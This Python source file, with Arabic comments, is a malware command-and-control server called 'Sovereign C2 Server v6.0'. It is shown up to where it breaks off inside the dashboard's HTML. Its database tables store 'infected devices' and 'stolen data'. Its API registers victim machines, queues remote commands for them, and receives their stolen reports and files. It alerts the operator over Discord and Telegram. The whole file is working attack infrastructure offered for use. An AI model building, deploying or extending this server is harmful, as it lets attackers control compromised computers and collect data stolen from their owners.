#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Sovereign C2 Server v6.0 - Professional Command & Control Server
يدعم: Discord Webhook, Telegram Bot, REST API, Dashboard
"""

import os
import sys
import json
import time
import base64
import hashlib
import logging
import sqlite3
import threading
import datetime
import requests
import argparse
import binascii
import hmac
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
from functools import wraps
from collections import defaultdict
from urllib.parse import urlparse

try:
    from flask import Flask, request, jsonify, render_template, redirect, url_for, session, abort
    from flask_cors import CORS
    from flask_socketio import SocketIO, emit
    from flask_limiter import Limiter
    from flask_limiter.util import get_remote_address
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
    import jwt
    import psutil
    import coloredlogs
except ImportError as e:
    print(f"[!] خطأ في استيراد المكتبات: {e}")
    print("[*] قم بتثبيت المكتبات المطلوبة:")
    print("pip install flask flask-cors flask-socketio flask-limiter cryptography pyjwt psutil coloredlogs requests")
    sys.exit(1)

# =====================================================================
# إعدادات السيرفر
# =====================================================================

class Config:
    """إعدادات السيرفر المركزية"""
    
    # السيرفر
    HOST = "0.0.0.0"
    PORT = int(os.environ.get("PORT", 5000))
    DEBUG = False
    SECRET_KEY = os.environ.get("SECRET_KEY", os.urandom(32).hex())
    
    # قاعدة البيانات
    DB_PATH = "sovereign.db"
    
    # JWT
    JWT_SECRET = os.environ.get("JWT_SECRET", os.urandom(32).hex())
    JWT_ALGORITHM = "HS256"
    JWT_EXPIRY = 86400  # 24 ساعة
    
    # Discord Webhook (اختياري)
    DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
    
    # Telegram Bot (اختياري)
    TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
    
    # API Keys
    API_KEYS = os.environ.get("API_KEYS", "").split(",")
    
    # Rate Limiting
    RATE_LIMIT = "100/minute"
    
    # كلمة مرور لوحة التحكم (يفضل تغييرها)
    ADMIN_USERNAME = os.environ.get("ADMIN_USER", "admin")
    ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", hashlib.sha256("sovereign2025".encode()).hexdigest())

# =====================================================================
# نظام التسجيل المتقدم
# =====================================================================

class Logger:
    """نظام تسجيل متعدد المستويات"""
    
    def __init__(self, name="Sovereign"):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.DEBUG)
        
        # تنسيق السجلات
        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        # ملف السجلات
        fh = logging.FileHandler('sovereign.log')
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)
        
        # عرض ملون على الكونسول
        coloredlogs.install(
            level='INFO',
            logger=self.logger,
            fmt='%(asctime)s | %(levelname)-8s | %(message)s',
            datefmt='%H:%M:%S'
        )
    
    def info(self, msg): self.logger.info(msg)
    def warn(self, msg): self.logger.warning(msg)
    def error(self, msg): self.logger.error(msg)
    def debug(self, msg): self.logger.debug(msg)
    def success(self, msg): self.logger.info(f"✅ {msg}")
    def fail(self, msg): self.logger.error(f"❌ {msg}")
    def event(self, msg): self.logger.info(f"⚡ {msg}")
    def data(self, msg): self.logger.info(f"📦 {msg}")

log = Logger()

# =====================================================================
# قاعدة البيانات
# =====================================================================

class Database:
    """إدارة قاعدة البيانات SQLite"""
    
    def __init__(self, db_path=Config.DB_PATH):
        self.db_path = db_path
        self.init_db()
    
    def get_connection(self):
        return sqlite3.connect(self.db_path, check_same_thread=False)
    
    def init_db(self):
        """إنشاء الجداول"""
        with self.get_connection() as conn:
            # جدول العملاء (الأجهزة المصابة)
            conn.execute('''
                CREATE TABLE IF NOT EXISTS clients (
                    id TEXT PRIMARY KEY,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    ip TEXT,
                    hostname TEXT,
                    username TEXT,
                    os TEXT,
                    hwid TEXT,
                    caps INTEGER DEFAULT 0,
                    status TEXT DEFAULT 'active',
                    notes TEXT,
                    tags TEXT
                )
            ''')
            
            # جدول التقارير (البيانات المسروقة)
            conn.execute('''
                CREATE TABLE IF NOT EXISTS reports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    type TEXT,
                    data TEXT,
                    size INTEGER,
                    hash TEXT,
                    processed BOOLEAN DEFAULT 0,
                    FOREIGN KEY(client_id) REFERENCES clients(id)
                )
            ''')
            
            # جدول الأوامر (C2)
            conn.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    command TEXT,
                    status TEXT DEFAULT 'pending',
                    result TEXT,
                    issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    executed_at TIMESTAMP,
                    FOREIGN KEY(client_id) REFERENCES clients(id)
                )
            ''')
            
            # جدول الملفات
            conn.execute('''
                CREATE TABLE IF NOT EXISTS files (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_id TEXT,
                    filename TEXT,
                    data BLOB,
                    size INTEGER,
                    hash TEXT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(client_id) REFERENCES clients(id)
                )
            ''')
            
            # جدول الأحداث
            conn.execute('''
                CREATE TABLE IF NOT EXISTS events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    type TEXT,
                    client_id TEXT,
                    details TEXT
                )
            ''')
            
            # إنشاء الفهارس
            conn.execute('CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_reports_client ON reports(client_id)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)')
            conn.execute('CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp)')
            
            conn.commit()
    
    # ========== العملاء ==========
    
    def register_client(self, client_id: str, data: dict) -> bool:
        """تسجيل عميل جديد أو تحديث معلوماته"""
        try:
            with self.get_connection() as conn:
                # التحقق من وجود العميل
                cur = conn.execute('SELECT id FROM clients WHERE id = ?', (client_id,))
                exists = cur.fetchone()
                
                if exists:
                    # تحديث معلومات العميل
                    conn.execute('''
                        UPDATE clients SET 
                            last_seen = CURRENT_TIMESTAMP,
                            ip = ?,
                            hostname = ?,
                            username = ?,
                            os = ?,
                            hwid = ?,
                            caps = ?,
                            status = ?
                        WHERE id = ?
                    ''', (
                        data.get('ip', ''),
                        data.get('hostname', ''),
                        data.get('username', ''),
                        data.get('os', ''),
                        data.get('hwid', ''),
                        data.get('caps', 0),
                        'active',
                        client_id
                    ))
                    log.debug(f"تم تحديث العميل {client_id}")
                else:
                    # إضافة عميل جديد
                    conn.execute('''
                        INSERT INTO clients (id, ip, hostname, username, os, hwid, caps, status)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        client_id,
                        data.get('ip', ''),
                        data.get('hostname', ''),
                        data.get('username', ''),
                        data.get('os', ''),
                        data.get('hwid', ''),
                        data.get('caps', 0),
                        'active'
                    ))
                    log.success(f"عميل جديد: {client_id} ({data.get('hostname', 'unknown')})")
                
                conn.commit()
                return True
        except Exception as e:
            log.error(f"فشل تسجيل العميل {client_id}: {e}")
            return False
    
    def get_clients(self, status: str = None) -> List[dict]:
        """الحصول على قائمة العملاء"""
        try:
            with self.get_connection() as conn:
                conn.row_factory = sqlite3.Row
                
                if status:
                    cur = conn.execute('''
                        SELECT * FROM clients WHERE status = ? ORDER BY last_seen DESC
                    ''', (status,))
                else:
                    cur = conn.execute('''
                        SELECT * FROM clients ORDER BY last_seen DESC
                    ''')
                
                return [dict(row) for row in cur.fetchall()]
        except Exception as e:
            log.error(f"فشل جلب العملاء: {e}")
            return []
    
    def get_client(self, client_id: str) -> Optional[dict]:
        """الحصول على معلومات عميل معين"""
        try:
            with self.get_connection() as conn:
                conn.row_factory = sqlite3.Row
                cur = conn.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
                row = cur.fetchone()
                return dict(row) if row else None
        except Exception as e:
            log.error(f"فشل جلب العميل {client_id}: {e}")
            return None
    
    def update_client_status(self, client_id: str, status: str) -> bool:
        """تحديث حالة العميل"""
        try:
            with self.get_connection() as conn:
                conn.execute('UPDATE clients SET status = ? WHERE id = ?', (status, client_id))
                conn.commit()
                return True
        except Exception as e:
            log.error(f"فشل تحديث حالة العميل {client_id}: {e}")
            return False
    
    # ========== التقارير ==========
    
    def add_report(self, client_id: str, report_type: str, data: str) -> int:
        """إضافة تقرير جديد"""
        try:
            size = len(data)
            data_hash = hashlib.sha256(data.encode()).hexdigest()
            
            with self.get_connection() as conn:
                cur = conn.execute('''
                    INSERT INTO reports (client_id, type, data, size, hash)
                    VALUES (?, ?, ?, ?, ?)
                ''', (client_id, report_type, data, size, data_hash))
                
                report_id = cur.lastrowid
                conn.commit()
                
                log.data(f"تقرير جديد من {client_id}: {report_type} ({size} bytes)")
                return report_id
        except Exception as e:
            log.error(f"فشل إضافة تقرير: {e}")
            return -1
    
    def get_reports(self, client_id: str = None, limit: int = 100) -> List[dict]:
        """الحصول على التقارير"""
        try:
            with self.get_connection() as conn:
                conn.row_factory = sqlite3.Row
                
                if client_id:
                    cur = conn.execute('''
                        SELECT * FROM reports WHERE client_id = ? 
                        ORDER BY timestamp DESC LIMIT ?
                    ''', (client_id, limit))
                else:
                    cur = conn.execute('''
                        SELECT * FROM reports ORDER BY timestamp DESC LIMIT ?
                    ''', (limit,))
                
                return [dict(row) for row in cur.fetchall()]
        except Exception as e:
            log.error(f"فشل جلب التقارير: {e}")
            return []
    
    # ========== الأوامر ==========
    
    def add_command(self, client_id: str, command: str) -> int:
        """إضافة أمر جديد لعميل"""
        try:
            with self.get_connection() as conn:
                cur = conn.execute('''
                    INSERT INTO commands (client_id, command, status)
                    VALUES (?, ?, ?)
                ''', (client_id, command, 'pending'))
                
                cmd_id = cur.lastrowid
                conn.commit()
                
                log.event(f"أمر جديد لـ {client_id}: {command}")
                return cmd_id
        except Exception as e:
            log.error(f"فشل إضافة أمر: {e}")
            return -1
    
    def get_pending_commands(self, client_id: str) -> List[dict]:
        """الحصول على الأوامر المعلقة لعميل"""
        try:
            with self.get_connection() as conn:
                conn.row_factory = sqlite3.Row
                cur = conn.execute('''
                    SELECT id, command FROM commands 
                    WHERE client_id = ? AND status = 'pending'
                    ORDER BY issued_at ASC
                ''', (client_id,))
                
                commands = [dict(row) for row in cur.fetchall()]
                
                # تحديث حالة الأوامر إلى 'sent'
                if commands:
                    for cmd in commands:
                        conn.execute('''
                            UPDATE commands SET status = 'sent' WHERE id = ?
                        ''', (cmd['id'],))
                    conn.commit()
                
                return commands
        except Exception as e:
            log.error(f"فشل جلب الأوامر المعلقة لـ {client_id}: {e}")
            return []
    
    def update_command_result(self, cmd_id: int, result: str, status: str = 'completed') -> bool:
        """تحديث نتيجة تنفيذ أمر"""
        try:
            with self.get_connection() as conn:
                conn.execute('''
                    UPDATE commands SET 
                        result = ?, 
                        status = ?, 
                        executed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                ''', (result, status, cmd_id))
                conn.commit()
                return True
        except Exception as e:
            log.error(f"فشل تحديث نتيجة الأمر {cmd_id}: {e}")
            return False
    
    # ========== الملفات ==========
    
    def save_file(self, client_id: str, filename: str, data: bytes) -> int:
        """حفظ ملف مرفوع من عميل"""
        try:
            file_hash = hashlib.sha256(data).hexdigest()
            size = len(data)
            
            with self.get_connection() as conn:
                cur = conn.execute('''
                    INSERT INTO files (client_id, filename, data, size, hash)
                    VALUES (?, ?, ?, ?, ?)
                ''', (client_id, filename, data, size, file_hash))
                
                file_id = cur.lastrowid
                conn.commit()
                
                log.data(f"ملف من {client_id}: {filename} ({size} bytes)")
                return file_id
        except Exception as e:
            log.error(f"فشل حفظ الملف: {e}")
            return -1
    
    def get_file(self, file_id: int) -> Optional[dict]:
        """استرجاع ملف"""
        try:
            with self.get_connection() as conn:
                conn.row_factory = sqlite3.Row
                cur = conn.execute('SELECT * FROM files WHERE id = ?', (file_id,))
                row = cur.fetchone()
                return dict(row) if row else None
        except Exception as e:
            log.error(f"فشل استرجاع الملف {file_id}: {e}")
            return None
    
    # ========== الأحداث ==========
    
    def log_event(self, event_type: str, client_id: str = None, details: dict = None):
        """تسجيل حدث"""
        try:
            details_json = json.dumps(details) if details else ''
            with self.get_connection() as conn:
                conn.execute('''
                    INSERT INTO events (type, client_id, details)
                    VALUES (?, ?, ?)
                ''', (event_type, client_id, details_json))
                conn.commit()
        except Exception as e:
            log.error(f"فشل تسجيل الحدث: {e}")
    
    # ========== الإحصائيات ==========
    
    def get_stats(self) -> dict:
        """الحصول على إحصائيات عامة"""
        try:
            with self.get_connection() as conn:
                stats = {}
                
                # عدد العملاء
                cur = conn.execute('SELECT COUNT(*) FROM clients')
                stats['total_clients'] = cur.fetchone()[0]
                
                # العملاء النشطون (آخر ساعة)
                cur = conn.execute('''
                    SELECT COUNT(*) FROM clients 
                    WHERE last_seen > datetime('now', '-1 hour')
                ''')
                stats['active_clients'] = cur.fetchone()[0]
                
                # عدد التقارير
                cur = conn.execute('SELECT COUNT(*) FROM reports')
                stats['total_reports'] = cur.fetchone()[0]
                
                # حجم البيانات
                cur = conn.execute('SELECT SUM(size) FROM reports')
                stats['total_data'] = cur.fetchone()[0] or 0
                
                # الأوامر المنفذة
                cur = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "completed"')
                stats['executed_commands'] = cur.fetchone()[0]
                
                return stats
        except Exception as e:
            log.error(f"فشل جلب الإحصائيات: {e}")
            return {}

# =====================================================================
# تشفير البيانات
# =====================================================================

class Crypto:
    """نظام تشفير متقدم"""
    
    def __init__(self, key: bytes = None):
        self.key = key or Fernet.generate_key()
        self.fernet = Fernet(self.key)
    
    def encrypt(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)
    
    def decrypt(self, token: bytes) -> bytes:
        try:
            return self.fernet.decrypt(token)
        except:
            return None
    
    @staticmethod
    def generate_key(password: str, salt: bytes = None) -> Tuple[bytes, bytes]:
        if salt is None:
            salt = os.urandom(16)
        
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt

# =====================================================================
# إرسال التنبيهات
# =====================================================================

class Notifier:
    """نظام إرسال التنبيهات عبر قنوات متعددة"""
    
    def __init__(self):
        self.discord_webhook = Config.DISCORD_WEBHOOK
        self.telegram_token = Config.TELEGRAM_TOKEN
        self.telegram_chat = Config.TELEGRAM_CHAT_ID
    
    def discord(self, message: str, color: int = 0x00ff00) -> bool:
        """إرسال تنبيه إلى Discord"""
        if not self.discord_webhook:
            return False
        
        try:
            data = {
                "embeds": [{
                    "title": "Sovereign C2 Alert",
                    "description": message,
                    "color": color,
                    "timestamp": datetime.datetime.utcnow().isoformat()
                }]
            }
            requests.post(self.discord_webhook, json=data, timeout=5)
            return True
        except Exception as e:
            log.error(f"فشل إرسال تنبيه Discord: {e}")
            return False
    
    def telegram(self, message: str) -> bool:
        """إرسال تنبيه إلى Telegram"""
        if not self.telegram_token or not self.telegram_chat:
            return False
        
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = {
                "chat_id": self.telegram_chat,
                "text": f"🔔 *Sovereign C2*\n{message}",
                "parse_mode": "Markdown"
            }
            requests.post(url, json=data, timeout=5)
            return True
        except Exception as e:
            log.error(f"فشل إرسال تنبيه Telegram: {e}")
            return False
    
    def notify(self, message: str, level: str = "info"):
        """إرسال تنبيه عبر جميع القنوات"""
        colors = {
            "info": 0x00ff00,
            "warn": 0xffaa00,
            "error": 0xff0000,
            "critical": 0xaa0000
        }
        
        self.discord(message, colors.get(level, 0x00ff00))
        self.telegram(message)

# =====================================================================
# مصادقة API
# =====================================================================

class Auth:
    """نظام المصادقة"""
    
    def __init__(self):
        self.secret = Config.JWT_SECRET
        self.algorithm = Config.JWT_ALGORITHM
    
    def generate_token(self, username: str) -> str:
        """توليد JWT token"""
        payload = {
            'username': username,
            'exp': datetime.datetime.utcnow() + datetime.timedelta(seconds=Config.JWT_EXPIRY),
            'iat': datetime.datetime.utcnow()
        }
        return jwt.encode(payload, self.secret, algorithm=self.algorithm)
    
    def verify_token(self, token: str) -> Optional[dict]:
        """التحقق من صحة token"""
        try:
            payload = jwt.decode(token, self.secret, algorithms=[self.algorithm])
            return payload
        except jwt.ExpiredSignatureError:
            return None
        except jwt.InvalidTokenError:
            return None
    
    def check_api_key(self, api_key: str) -> bool:
        """التحقق من صحة API key"""
        return api_key in Config.API_KEYS

auth = Auth()
notifier = Notifier()
db = Database()
crypto = Crypto()

# =====================================================================
# Flask Application
# =====================================================================

app = Flask(__name__)
app.secret_key = Config.SECRET_KEY
app.config['JSON_AS_ASCII'] = False
app.config['JSON_SORT_KEYS'] = False

CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Rate Limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=[Config.RATE_LIMIT]
)

# =====================================================================
# Middleware
# =====================================================================

def require_auth(f):
    """ميدل وير للتحقق من المصادقة"""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        api_key = request.headers.get('X-API-Key')
        
        if api_key and auth.check_api_key(api_key):
            return f(*args, **kwargs)
        
        if auth_header and auth_header.startswith('Bearer '):
            token = auth_header.split(' ')[1]
            payload = auth.verify_token(token)
            if payload:
                return f(*args, **kwargs)
        
        if 'user' in session:
            return f(*args, **kwargs)
        
        return jsonify({'error': 'Unauthorized'}), 401
    return decorated

def admin_only(f):
    """ميدل وير للمشرفين فقط"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user' not in session or session.get('user') != Config.ADMIN_USERNAME:
            return jsonify({'error': 'Admin only'}), 403
        return f(*args, **kwargs)
    return decorated

# =====================================================================
# Routes API
# =====================================================================

@app.route('/', methods=['GET'])
def home():
    """الصفحة الرئيسية"""
    return jsonify({
        'name': 'Sovereign C2 Server',
        'version': '6.0.0',
        'status': 'operational',
        'timestamp': datetime.datetime.utcnow().isoformat(),
        'endpoints': {
            'client': '/api/client',
            'report': '/api/report',
            'command': '/api/command',
            'file': '/api/file',
            'stats': '/api/stats'
        }
    })

# ========== Client Endpoints ==========

@app.route('/api/client/register', methods=['POST'])
@limiter.limit("10/minute")
def client_register():
    """تسجيل عميل جديد"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        client_id = data.get('id')
        if not client_id:
            return jsonify({'error': 'Missing client ID'}), 400
        
        # إضافة IP
        data['ip'] = request.remote_addr
        
        # تسجيل في قاعدة البيانات
        db.register_client(client_id, data)
        
        # تسجيل الحدث
        db.log_event('client_register', client_id, data)
        
        # إرسال تنبيه
        notifier.notify(f"عميل جديد: {data.get('hostname', 'unknown')} ({client_id})")
        
        # إرسال عبر WebSocket
        socketio.emit('client_update', {
            'type': 'new',
            'client_id': client_id,
            'data': data
        })
        
        return jsonify({'status': 'registered'}), 200
    
    except Exception as e:
        log.error(f"خطأ في تسجيل العميل: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/client/heartbeat', methods=['POST'])
@limiter.limit("60/minute")
def client_heartbeat():
    """نبض القلب من العميل"""
    try:
        data = request.get_json()
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'Missing client ID'}), 400
        
        # تحديث آخر ظهور
        db.register_client(client_id, {'last_seen': 'now', 'ip': request.remote_addr})
        
        # التحقق من الأوامر المعلقة
        commands = db.get_pending_commands(client_id)
        
        return jsonify({
            'status': 'ok',
            'commands': commands,
            'server_time': datetime.datetime.utcnow().isoformat()
        }), 200
    
    except Exception as e:
        log.error(f"خطأ في نبض القلب: {e}")
        return jsonify({'error': str(e)}), 500

# ========== Reports Endpoints ==========

@app.route('/api/report', methods=['POST'])
@limiter.limit("30/minute")
def submit_report():
    """استقبال تقرير من عميل"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        report_type = data.get('type')
        content = data.get('content')
        
        if not all([client_id, report_type, content]):
            return jsonify({'error': 'Missing data'}), 400
        
        # حفظ التقرير
        report_id = db.add_report(client_id, report_type, content)
        
        if report_id > 0:
            # تسجيل الحدث
            db.log_event('report_received', client_id, {
                'type': report_type,
                'size': len(content)
            })
            
            # إرسال عبر WebSocket
            socketio.emit('new_report', {
                'client_id': client_id,
                'type': report_type,
                'preview': content[:200]
            })
            
            return jsonify({
                'status': 'success',
                'report_id': report_id
            }), 200
        else:
            return jsonify({'error': 'Failed to save report'}), 500
    
    except Exception as e:
        log.error(f"خطأ في استقبال التقرير: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/reports', methods=['GET'])
@require_auth
def get_reports():
    """الحصول على التقارير"""
    client_id = request.args.get('client_id')
    limit = request.args.get('limit', 100, type=int)
    
    reports = db.get_reports(client_id, limit)
    return jsonify(reports)

# ========== Commands Endpoints ==========

@app.route('/api/command', methods=['POST'])
@require_auth
def issue_command():
    """إصدار أمر لعميل"""
    try:
        data = request.get_json()
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        cmd_id = db.add_command(client_id, command)
        
        if cmd_id > 0:
            notifier.notify(f"أمر صادر: {command[:50]}... لـ {client_id}")
            
            # إرسال عبر WebSocket
            socketio.emit('command_issued', {
                'client_id': client_id,
                'command': command,
                'cmd_id': cmd_id
            })
            
            return jsonify({
                'status': 'success',
                'command_id': cmd_id
            }), 200
        else:
            return jsonify({'error': 'Failed to add command'}), 500
    
    except Exception as e:
        log.error(f"خطأ في إصدار الأمر: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/<int:cmd_id>/result', methods=['POST'])
def submit_command_result(cmd_id):
    """استقبال نتيجة أمر"""
    try:
        data = request.get_json()
        result = data.get('result')
        status = data.get('status', 'completed')
        
        if db.update_command_result(cmd_id, result, status):
            return jsonify({'status': 'success'}), 200
        else:
            return jsonify({'error': 'Command not found'}), 404
    
    except Exception as e:
        log.error(f"خطأ في استقبال نتيجة الأمر: {e}")
        return jsonify({'error': str(e)}), 500

# ========== Files Endpoints ==========

@app.route('/api/file/upload', methods=['POST'])
def upload_file():
    """رفع ملف من عميل"""
    try:
        client_id = request.form.get('client_id')
        file = request.files.get('file')
        
        if not client_id or not file:
            return jsonify({'error': 'Missing data'}), 400
        
        # قراءة الملف
        file_data = file.read()
        filename = file.filename
        
        # حفظ في قاعدة البيانات
        file_id = db.save_file(client_id, filename, file_data)
        
        if file_id > 0:
            notifier.notify(f"ملف من {client_id}: {filename} ({len(file_data)} bytes)")
            
            socketio.emit('file_uploaded', {
                'client_id': client_id,
                'filename': filename,
                'size': len(file_data),
                'file_id': file_id
            })
            
            return jsonify({
                'status': 'success',
                'file_id': file_id
            }), 200
        else:
            return jsonify({'error': 'Failed to save file'}), 500
    
    except Exception as e:
        log.error(f"خطأ في رفع الملف: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/file/<int:file_id>', methods=['GET'])
@require_auth
def download_file(file_id):
    """تحميل ملف"""
    file_data = db.get_file(file_id)
    if not file_data:
        return jsonify({'error': 'File not found'}), 404
    
    return file_data['data'], 200, {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': f'attachment; filename="{file_data["filename"]}"'
    }

# ========== Stats Endpoints ==========

@app.route('/api/stats', methods=['GET'])
@require_auth
def get_stats():
    """الحصول على إحصائيات"""
    stats = db.get_stats()
    return jsonify(stats)

@app.route('/api/clients', methods=['GET'])
@require_auth
def get_clients():
    """الحصول على قائمة العملاء"""
    status = request.args.get('status')
    clients = db.get_clients(status)
    return jsonify(clients)

@app.route('/api/client/<client_id>', methods=['GET'])
@require_auth
def get_client_details(client_id):
    """الحصول على تفاصيل عميل"""
    client = db.get_client(client_id)
    if not client:
        return jsonify({'error': 'Client not found'}), 404
    
    # الحصول على التقارير
    reports = db.get_reports(client_id, 50)
    client['reports'] = reports
    
    return jsonify(client)

# ========== Auth Endpoints ==========

@app.route('/login', methods=['POST'])
def login():
    """تسجيل الدخول إلى لوحة التحكم"""
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    if username == Config.ADMIN_USERNAME:
        hashed = hashlib.sha256(password.encode()).hexdigest()
        if hashed == Config.ADMIN_PASSWORD:
            token = auth.generate_token(username)
            session['user'] = username
            return jsonify({
                'status': 'success',
                'token': token
            }), 200
    
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/logout', methods=['POST'])
def logout():
    """تسجيل الخروج"""
    session.pop('user', None)
    return jsonify({'status': 'logged out'}), 200

# =====================================================================
# WebSocket Events
# =====================================================================

@socketio.on('connect')
def handle_connect():
    log.info(f"WebSocket client connected: {request.remote_addr}")

@socketio.on('disconnect')
def handle_disconnect():
    log.info(f"WebSocket client disconnected: {request.remote_addr}")

@socketio.on('subscribe')
def handle_subscribe(data):
    """الاشتراك في تحديثات عميل معين"""
    client_id = data.get('client_id')
    if client_id:
        room = f"client_{client_id}"
        emit('subscribed', {'client_id': client_id})

# =====================================================================
# Dashboard (HTML)
# =====================================================================

@app.route('/dashboard')
@require_auth
def dashboard():
    """لوحة التحكم"""
    stats = db.get_stats()
    clients = db.get_clients('active')[:10]
    reports = db.get_reports(limit=20)
    
    html = f"""
    <!DOCTYPE html>
    <html dir="rtl">
    <head>
        <title>Sovereign C2 Dashboard</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }}
            
            body {{
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }}
            
            .container {{
                max-width: 1400px;
                margin: 0 auto;
            }}
            
            .header {{
                background: white;
                border-radius: 15px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            }}
            
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }}
            
            .stat-card {{
                background: white;
                border-radius: 10px;
                padding: 20px;
                text-align: center;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                transition: transform 0.3s;
            }}
            
            .stat-card:hover {{
                transform: translateY(-5px);
            }}
            
            .stat-value {{
                font-size: 2.5em;
                font-weight: bold;
                color: #667eea;
            }}
            
            .stat-label {{
                color: #666;
                margin-top: 10px;
            }}
            
            .charts-grid {{
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin-bottom: 20px;
            }}
            
            .chart-container {{
                background: white;
                border-radius: 15px;
                padding: 20px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }}
            
            .section {{
                background: white;
                border-radius: 15px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            }}
            
            .section-title {{
                font-size: 1.3em;
                color: #333;
                margin-bottom: 20px;
                border-bottom: 2px solid #667eea;
                padding-bottom: 10px;
            }}
            
            table {{
                width: 100%;
                border-collapse: collapse;
            }}
            
            th, td {{
                padding: 12px;
                text-align: right;
                border-bottom: 1px solid #ddd;
            }}
            
            th {{
                background-color: #f5f5f5;
                color: #333;
                font-weight: 600;
            }}
            
            tr:hover {{
                background-color: #f9f9f9;
            }}
            
            .status-badge {{
                display: inline-block;
                padding: 5px 10px;
                border-radius: 20px;
                font-size: 0.85em;
                font-weight: 600;
            }}
            
            .status-active {{
                background: #d4edda;
                color: #155724;
            }}
            
            .status-inactive {{
                background: #f8d7da;
                color: #721c24;
            }}
            
            .btn {{
                display: inline-block;
                padding: 8px 16px;
                border-radius: 5px;
                border: none;
                cursor: pointer;
                font-size: 0.9em;
                transition: all 0.3s;
            }}
            
            .btn-primary {{
                background: #667eea;
                color: white;
            }}
            
            .btn-primary:hover {{
                background: #5a67d8;
            }}
            
            .btn-danger {{
                background: #e53e3e;
                color: white;
            }}
            
            .btn-success {{
                background: #48bb78;
                color: white;
            }}
            
            .modal {{
                display: none;
                position: fixed;
                z-index: 1000;
                left: 0;
                top: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.5);
            }}
            
            .modal-content {{
                background: white;
                margin: 10% auto;
                padding: 20px;
                border-radius: 15px;
                width: 90%;
                max-width: 500px;
                position: relative;
            }}
            
            .close {{
                position: absolute;
                left: 20px;
                top: 10px;
                font-size: 28px;
                cursor: pointer;
            }}
            
            input, textarea, select {{
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: 1px solid #ddd;
                border-radius: 5px;
                font-family: inherit;
            }}
            
            .notification {{
                position: fixed;
                bottom: 20px;
                left: 20px;
                background: white;
                padding: 15px 20px;
                border-radius: 10px;
                box-shadow: 0 5px 15px rgba(0,0,0,0.2);
                display: none;
                z-index: 1000;
            }}
            
            @media (max-width: 768px) {{
                .charts-grid {{
                    grid-template-columns: 1fr;
                }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
